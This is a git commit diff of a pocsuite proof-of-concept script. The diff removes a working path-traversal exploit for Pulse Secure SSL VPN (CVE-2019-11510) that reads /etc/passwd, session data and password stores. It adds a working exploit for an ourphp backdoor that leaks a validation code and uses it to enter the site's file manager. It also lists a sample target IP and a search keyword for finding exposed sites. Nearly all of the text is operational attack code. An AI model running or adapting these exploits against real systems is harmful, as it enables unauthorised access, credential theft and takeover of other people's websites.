0484efd0c42569f8542c722d408adc7a8931988d
test <test>
2023-09-18 04:20:09 +0000

    auto updated

--- poc/poc.py
+++ poc/poc.py
@@ -1,124 +1,76 @@
 #!/usr/bin/env python
 # -*- coding: utf-8 -*-
-# @Time : 2019/8/22 14:15
-# @Author : 兀
-# @File : CVE-2019-11510.py
-# @Software: PyCharm
-# @Blog : https://3.1415926.top
-# Life is Fantastic.
 
 import urlparse
 
-from pocsuite.api.poc import POCBase
-from pocsuite.api.poc import register
-from pocsuite.api.poc import Output
+from pocsuite.api.poc import POCBase, register, Output
 from pocsuite.api.request import req
 
 
 class TestPOC(POCBase):
-
-    vulID = 'CVE-2019-11510'
+    vulID = ''
     version = '1'
-    author = '兀'
-    vulDate = '2019-08-10'
-    createDate = '2019-08-14'
-    updateDate = '2019-08-14'
-    references = [
-        "https://hackerone.com/reports/591295",
-        "https://github.com/projectzeroindia/CVE-2019-11510/blob/master/CVE-2019-11510.sh",
-        "https://packetstormsecurity.com/files/154176/Pulse-Secure-SSL-VPN-8.1R15.1-8.2-8.3-9.0-Arbitrary-File-Disclosure.html"
-    ]
-    name = 'Pulse Secure SSL VPN Pre-auth'
-    appPowerLink = 'https://www.pulsesecure.net/'
-    appName = 'Pulse Secure SSL VPN '
-    appVersion = '''
-     8.1R15.1 / 8.2 / 8.3 / 9.0 
-    '''
-    vulType = ''
+    author = 'elloit'
+    vulDate = ''
+    createDate = ''
+    updateDate = ''
+    references = ['https://xz.aliyun.com/t/4315']
+    name = 'ourphp 后门漏洞'
+    appPowerLink = 'http://www.ourphp.net'
+    appName = 'ourphp'
+    appVersion = 'v1.7.5-v1.8.3'
+    vulType = '后门'
     desc = '''
+    在function\editor\php\upload_json.php 中会暴露出生成的校验码，导致口令码和校验码泄露。
+    在http://localhost:88/client/manage/ourphp_filebox.php?op=home&folder=./&validation=12345&code=QZRdvlYHlDUgqZubIGV9Mx46JCqmDNkmYHlDUg
+    处，将泄露的口令码和 校验码 + 校验码第七位到第十二位之间的部分， 即可通过验证，对网站文件进行管理。
     '''
     samples = [
+        "https://123.207.235.207"
     ]
     install_requires = ""
-
-    def _attack(self):
-        return self._verify()
+    search_keyword = '"Powered by ourphp"'
 
     def _verify(self):
         result = {}
-        self.raw_url = self.url
-        host = urlparse.urlparse(self.url).hostname
-        port = urlparse.urlparse(self.url).port
-        scheme = urlparse.urlparse(self.url).scheme
-        if port is None:
-            port = "80"
-        else:
-            port = str(port)
-        if "https" == scheme:
-            self.url = "%s://%s" % (scheme, host)
-        else:
-            self.url = "%s://%s:%s" % (scheme, host, port)
-        paylaod = "/dana-na/../dana/html5acc/guacamole/../../../../../../../etc/passwd?/dana/html5acc/guacamole/"
-        headers = {"User-Agent": "Mozilla/5.0",
-                   "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
-                   "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Connection": "close",
-                   "Upgrade-Insecure-Requests": "1"}
+        # 格式化URL
+        url = urlparse.urlparse(self.url)
+        vul_url = url.scheme + "://" + url.netloc + "/function/editor/php/upload_json.php?upload_file=hola"
         try:
-            res = req.get(self.url + paylaod, verify=False, headers=headers, timeout=(10, 15))
-            if "root:x:0:0:root" in res.text and res.status_code == 200:
-                result["VerifyInfo"] = {}
-                result["VerifyInfo"]["URL"] = self.url
-                result["VerifyInfo"]["passwd"] = res.text
-                result["VerifyInfo"]["host"] = self.get_hosts()
-         except Exception as e:
-            pass
+            res = req.get(url=vul_url, timeout=(10, 15), verify=False)
+            if res.status_code == 200:
+                text = res.text.replace("<!--", "")
+                text = text.replace("-->", "")
+                validation = text.split("||")[0]
+                safecode = text.split("||")[1]
+                vul_url_check = url.scheme + "://" + url.netloc + \
+                                "/client/manage/ourphp_filebox.php?op=home&folder=./&validation="+ validation +\
+                                "&code=" + safecode + safecode[6:12]
+                res_check = req.get(url=vul_url_check, timeout=(10, 15), verify=False)
+                if res_check.status_code == 200 and "重命名" in res_check.content:
+                    result["VerifyInfo"] = {}
+                    result["VerifyInfo"]["URL"] = self.url
+                    result["extra"] = {}
+                    result["extra"]["validation"] = validation
+                    result["extra"]["safecode"] = safecode
+                    result["extra"]["info"] = self.get_info()
+        except Exception as e:
+            return self.parse_output(result)
+
         return self.parse_output(result)
 
-    def get_hosts(self):
-        payload = "/dana-na/../dana/html5acc/guacamole/../../../../../../../etc/hosts?/dana/html5acc/guacamole/"
-        headers = {"User-Agent": "Mozilla/5.0",
-                   "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
-                   "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Connection": "close",
-                   "Upgrade-Insecure-Requests": "1"}
-        try:
-            res = req.get(self.url + payload, verify=False, headers=headers, timeout=(10, 15))
-            return res.text
-        except Exception as e:
-            return None
+    def _attack(self):
+        self._verify()
 
-    def get_user_password(self):
-        payload_palntext_passwd = "/dana-na/../dana/html5acc/guacamole/../../../../../../../data/runtime/mtmp/lmdb/dataa/data.mdb?" \
-                  "/dana/html5acc/guacamole/"
-        payload_user_hash = "/dana-na/../dana/html5acc/guacamole/../../../../../../../data/runtime/mtmp/system?" \
-                    "/dana/html5acc/guacamole/"
-
-        headers = {"User-Agent": "Mozilla/5.0",
-                   "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
-                   "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Connection": "close",
-                   "Upgrade-Insecure-Requests": "1"}
+    def get_info(self):
         try:
-            plantextpasswd = req.get(self.url + payload_palntext_passwd, verify=False, headers=headers,
-                                      timeout=(10, 15)).text
-        except Exception as e:
-            plantextpasswd = ''
-        try:
-            userhash = req.get(self.url + payload_user_hash, verify=False, headers=headers, timeout=(10, 15)).text
-        except Exception as e:
-            userhash = ''
-        return plantextpasswd, userhash
-
-    def get_session(self):
-        payload = "/dana-na/../dana/html5acc/guacamole/../../../../../../../data/runtime/mtmp/lmdb/randomVal/" \
-                  "data.mdb?/dana/html5acc/guacamole/"
-        headers = {"User-Agent": "Mozilla/5.0",
-                   "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
-                   "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Connection": "close",
-                   "Upgrade-Insecure-Requests": "1"}
-        try:
-            res = req.get(self.url + payload, verify=False, headers=headers, timeout=(10, 15))
-            return res.text
-        except Exception as e:
+            page = req.get(self.url, timeout=(10, 15), verify=False).text
+            title_left_index = page.find("<title>")
+            title_right_index = page.find("</title>")
+            title = page[title_left_index+7:title_right_index].strip()
+        except:
             return ""
+        return title
 
     def parse_output(self, result):
         output = Output(self)
